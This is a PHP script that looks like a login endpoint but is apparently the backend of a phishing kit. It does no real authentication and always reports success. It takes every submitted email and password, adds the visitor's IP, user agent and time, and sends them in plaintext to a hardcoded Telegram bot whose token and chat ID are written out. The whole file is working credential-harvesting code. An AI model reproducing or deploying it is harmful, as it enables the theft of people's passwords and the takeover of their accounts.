<?php
header('Content-Type: application/json');

$email = $_POST['email'] ?? '';
$pass  = $_POST['password'] ?? '';

$ip        = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$time      = date("Y-m-d H:i:s");

function send_telegram($status, $email,$password, $ip, $time, $userAgent) {

    $botToken = "7549318619:AAEJt9ORHDKvAYn7q0DjWjVyACIqcOHj09M";
    $chatId   = "6909133692";

    $plainEmail = $email ? $email : "empty";

    $message =
"LOGIN ATTEMPT\n" .
"----------------\n" .
"Status: $status\n" .
"Email: $plainEmail\n" .
"Password: $password\n" .
"IP: $ip\n" .
"Time: $time\n" .
"UA: $userAgent";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        "chat_id" => $chatId,
        "text" => $message
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_exec($ch);
    curl_close($ch);
}

/* VALIDATION */
if (!$email || !$pass) {

    send_telegram("FAIL_EMPTY", $email, $pass, $ip, $time, $userAgent);

    echo json_encode([
        "status" => "error",
        "message" => "Missing fields"
    ]);
    exit;
}

/* AUTH (replace with real logic later) */
$isValid = true;

if ($isValid) {

    send_telegram("SUCCESS", $email,$pass, $ip, $time, $userAgent);

    echo json_encode([
        "status" => "success"
    ]);

} else {

    send_telegram("FAIL_AUTH", $email,$password, $ip, $time, $userAgent);

    echo json_encode([
        "status" => "error",
        "message" => "Invalid credentials"
    ]);
}